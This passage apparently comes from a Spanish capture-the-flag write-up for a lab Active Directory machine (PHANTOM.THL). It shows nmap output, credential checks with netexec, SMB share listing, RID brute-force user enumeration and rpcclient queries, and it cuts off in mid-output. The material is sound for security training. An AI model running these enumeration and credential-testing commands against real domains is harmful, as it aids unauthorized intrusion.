+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: PHANTOM.THL, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.PHANTOM.THL
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.PHANTOM.THL
+</span></span><span style="display:flex;"><span>| Not valid before: 2026-02-21T23:24:38
+</span></span><span style="display:flex;"><span>|_Not valid after:  2027-02-21T23:24:38
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-04-27T05:26:59+00:00; +15m15s from scanner time.
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: PHANTOM.THL, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-04-27T05:26:59+00:00; +15m15s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.PHANTOM.THL
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.PHANTOM.THL
+</span></span><span style="display:flex;"><span>| Not valid before: 2026-02-21T23:24:38
+</span></span><span style="display:flex;"><span>|_Not valid after:  2027-02-21T23:24:38
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: PHANTOM.THL, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-04-27T05:26:59+00:00; +15m15s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.PHANTOM.THL
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.PHANTOM.THL
+</span></span><span style="display:flex;"><span>| Not valid before: 2026-02-21T23:24:38
+</span></span><span style="display:flex;"><span>|_Not valid after:  2027-02-21T23:24:38
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>59458/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>59464/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>59466/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>59478/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>59487/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>59503/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 15m15s, deviation: 0s, median: 15m14s
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: XX <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2026-04-27T05:26:20
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3.1.1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 94.34 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Gracias a este escaneo, podemos ver muchas cosas interesantes:</p>
+<ul>
+<li>Podemos ver cuál es el dominio del <strong>AD</strong> siendo <code>PHANTOM.THL</code> y <code>DC01.PHANTOM.THL</code>, siendo que podemos guardarlos en el <code>/etc/hosts</code>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;192.168.56.100 PHANTOM.THL DC01.PHANTOM.THL&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></div><ul>
+<li>Vemos que el <strong>puerto 5985</strong> está abierto, lo que nos dice que quizá nos podamos conectar a la máquina víctima vía <strong>WinRM</strong>.</li>
+<li>El <strong>servicio SMB</strong> nos dice que se necesita un usuario y contraseña para poder utilizarlo.</li>
+</ul>
+<p>Para avanzar con esta máquina, tenemos un usuario y contraseña que nos puede ayudar a encontrar alguna vulnerabilidad:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>User: mark
+</span></span><span style="display:flex;"><span>Pass: suP3rPa$sw0rd2026!&amp;
+</span></span></code></pre></div><p>Vamos a comenzar con enumeración del <strong>servicio SMB</strong>, luego del <strong>servicio RPC</strong> y, por último, veamos que podemos realizar ante el <strong>servicio Kerberos</strong>.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="SMB">Enumeración de Servicio SMB</h3>
+<p>Utilicemos la herramienta <strong>netexec</strong> para ver información del <strong>servicio SMB</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 192.168.56.100
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:PHANTOM.THL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Ahora, probemos si las credenciales que nos dieron funcionan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 192.168.56.100 -u <span style="color:#e6db74">&#39;mark&#39;</span> -p <span style="color:#e6db74">&#39;suP3rPa$sw0rd2026!&amp;&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:PHANTOM.THL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PHANTOM.THL<span style="color:#ae81ff">\m</span>ark:suP3rPa$sw0rd2026!&amp;
+</span></span></code></pre></div><p>Sí funcionan.</p>
+<p>Veamos qué archivos compartidos existen con la herramienta <strong>smbmap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.56.100 -u <span style="color:#e6db74">&#39;mark&#39;</span> -p <span style="color:#e6db74">&#39;suP3rPa$sw0rd2026!&amp;&#39;</span> --no-banner
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                      
+</span></span><span style="display:flex;"><span>                                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 192.168.56.100:445	Name: 192.168.56.100      	Status: Authenticated
+</span></span><span style="display:flex;"><span>	Disk                                                  	Permissions	Comment
+</span></span><span style="display:flex;"><span>	----                                                  	-----------	-------
+</span></span><span style="display:flex;"><span>	ADMIN$                                            	NO ACCESS	Admin remota
+</span></span><span style="display:flex;"><span>	C$                                                	NO ACCESS	Recurso predeterminado
+</span></span><span style="display:flex;"><span>	Dev Tools                                         	READ, WRITE	Dev Tools
+</span></span><span style="display:flex;"><span>	IPC$                                              	READ ONLY	IPC remota
+</span></span><span style="display:flex;"><span>	NETLOGON                                          	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
+</span></span><span style="display:flex;"><span>	SYSVOL                                            	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>Existe un directorio en el que podemos leer y escribir.</p>
+<p>Veamos su contenido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.56.100 -u <span style="color:#e6db74">&#39;mark&#39;</span> -p <span style="color:#e6db74">&#39;suP3rPa$sw0rd2026!&amp;&#39;</span> -r <span style="color:#e6db74">&#39;Dev Tools&#39;</span> --no-banner
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                      
+</span></span><span style="display:flex;"><span>                                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 192.168.56.100:445	Name: 192.168.56.100      	Status: Authenticated
+</span></span><span style="display:flex;"><span>	Disk                                                  	Permissions	Comment
+</span></span><span style="display:flex;"><span>	----                                                  	-----------	-------
+</span></span><span style="display:flex;"><span>	ADMIN$                                            	NO ACCESS	Admin remota
+</span></span><span style="display:flex;"><span>	C$                                                	NO ACCESS	Recurso predeterminado
+</span></span><span style="display:flex;"><span>	Dev Tools                                         	READ, WRITE	Dev Tools
+</span></span><span style="display:flex;"><span>	./Dev Tools
+</span></span><span style="display:flex;"><span>	dr--r--r--                <span style="color:#ae81ff">0</span> Sun Apr <span style="color:#ae81ff">26</span> 23:30:33 2026	.
+</span></span><span style="display:flex;"><span>	dr--r--r--                <span style="color:#ae81ff">0</span> Sat Feb <span style="color:#ae81ff">21</span> 11:29:29 2026	..
+</span></span><span style="display:flex;"><span>	IPC$                                              	READ ONLY	IPC remota
+</span></span><span style="display:flex;"><span>	NETLOGON                                          	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
+</span></span><span style="display:flex;"><span>	SYSVOL                                            	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>Curiosamente, no hay nada.</p>
+<p>Lo que podríamos hacer es obtener todos los usuarios existentes de la máquina, aplicando un <strong>RYD Cycling Attack</strong>.</p>
+<h4 id="RYD">Aplicando RYD Cycling Attack</h4>
+<p>Esto lo aplicaremos con la herramienta <strong>netexec</strong> y la flag <code>--rid-brute</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 192.168.56.100 -u <span style="color:#e6db74">&#39;mark&#39;</span> -p <span style="color:#e6db74">&#39;suP3rPa$sw0rd2026!&amp;&#39;</span> --rid-brute
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:PHANTOM.THL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PHANTOM.THL<span style="color:#ae81ff">\m</span>ark:suP3rPa$sw0rd2026!&amp; 
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             498: PHANTOM<span style="color:#ae81ff">\E</span>nterprise Domain Controllers de sólo lectura <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             500: PHANTOM<span style="color:#ae81ff">\A</span>dministrador <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             501: PHANTOM<span style="color:#ae81ff">\I</span>nvitado <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             502: PHANTOM<span style="color:#ae81ff">\k</span>rbtgt <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             512: PHANTOM<span style="color:#ae81ff">\A</span>dmins. del dominio <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             513: PHANTOM<span style="color:#ae81ff">\U</span>suarios del dominio <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             514: PHANTOM<span style="color:#ae81ff">\I</span>nvitados del dominio <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             515: PHANTOM<span style="color:#ae81ff">\E</span>quipos del dominio <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             516: PHANTOM<span style="color:#ae81ff">\C</span>ontroladores de dominio <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             517: PHANTOM<span style="color:#ae81ff">\P</span>ublicadores de certificados <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             518: PHANTOM<span style="color:#ae81ff">\A</span>dministradores de esquema <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             519: PHANTOM<span style="color:#ae81ff">\A</span>dministradores de empresas <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             520: PHANTOM<span style="color:#ae81ff">\P</span>ropietarios del creador de directivas de grupo <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             521: PHANTOM<span style="color:#ae81ff">\C</span>ontroladores de dominio de sólo lectura <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             522: PHANTOM<span style="color:#ae81ff">\C</span>ontroladores de dominio clonables <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             525: PHANTOM<span style="color:#ae81ff">\P</span>rotected Users <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             526: PHANTOM<span style="color:#ae81ff">\A</span>dministradores clave <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             527: PHANTOM<span style="color:#ae81ff">\A</span>dministradores clave de la organización <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             553: PHANTOM<span style="color:#ae81ff">\S</span>ervidores RAS e IAS <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             571: PHANTOM<span style="color:#ae81ff">\G</span>rupo de replicación de contraseña RODC permitida <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             572: PHANTOM<span style="color:#ae81ff">\G</span>rupo de replicación de contraseña RODC denegada <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1000: PHANTOM<span style="color:#ae81ff">\D</span>C01$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1101: PHANTOM<span style="color:#ae81ff">\D</span>nsAdmins <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1102: PHANTOM<span style="color:#ae81ff">\D</span>nsUpdateProxy <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1103: PHANTOM<span style="color:#ae81ff">\m</span>ark <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1104: PHANTOM<span style="color:#ae81ff">\b</span>ob <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1105: PHANTOM<span style="color:#ae81ff">\j</span>oe <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1106: PHANTOM<span style="color:#ae81ff">\m</span>ia <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1107: PHANTOM<span style="color:#ae81ff">\s</span>andra <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1108: PHANTOM<span style="color:#ae81ff">\m</span>aria <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1109: PHANTOM<span style="color:#ae81ff">\a</span>na <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1110: PHANTOM<span style="color:#ae81ff">\m</span>ichael <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1111: PHANTOM<span style="color:#ae81ff">\i</span>an <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1112: PHANTOM<span style="color:#ae81ff">\j</span>oshua <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1113: PHANTOM<span style="color:#ae81ff">\f</span>rank <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1115: PHANTOM<span style="color:#ae81ff">\t</span>omas <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1116: PHANTOM<span style="color:#ae81ff">\r</span>obert <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1117: PHANTOM<span style="color:#ae81ff">\I</span>T <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1118: PHANTOM<span style="color:#ae81ff">\S</span>upport <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1119: PHANTOM<span style="color:#ae81ff">\R</span>RHH <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1120: PHANTOM<span style="color:#ae81ff">\F</span>inances <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1121: PHANTOM<span style="color:#ae81ff">\D</span>evelopers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1122: PHANTOM<span style="color:#ae81ff">\H</span>elpDesk <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1123: PHANTOM<span style="color:#ae81ff">\D</span>evOps <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1124: PHANTOM<span style="color:#ae81ff">\L</span>egacyAdmins <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             1125: PHANTOM<span style="color:#ae81ff">\M</span>onitoring <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Observa todos los grupos y usuarios que obtuvimos.</p>
+<p>Con estos usuarios podemos intentar aplicar un <strong>Password Spraying</strong> para saber si alguno de estos tiene la misma contraseña que nuestro usuario actual, pero esto no servira.</p>
+<p>Otra opción que tenemos es subir un archivo al directorio <strong>Dev Tools</strong>, suponiendo que todos los archivos que estén en este recurso se ejecuten, pero tampoco servirá.</p>
+<p>Por ahora, dejemos un poco <strong>SMB</strong> y apliquemos enumeración al <strong>servicio RPC</strong>.</p>
+<h3 id="RPC">Enumeración del Servicio RPC</h3>
+<p>Entremos al <strong>servicio RPC</strong> utilizando la herramienta <strong>rpcclient</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rpcclient -U <span style="color:#e6db74">&#39;mark%suP3rPa$sw0rd2026!&amp;&#39;</span> 192.168.56.100
+</span></span><span style="display:flex;"><span>rpcclient $&gt;
+</span></span></code></pre></div><p>Estamos dentro.</p>
+<p>Veamos los usuarios existentes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rpcclient $&gt; enumdomusers
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>Administrador<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f4<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>Invitado<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f5<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>krbtgt<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f6<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>mark<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x44f<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>bob<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x450<span style="color:#f92672">]</span>
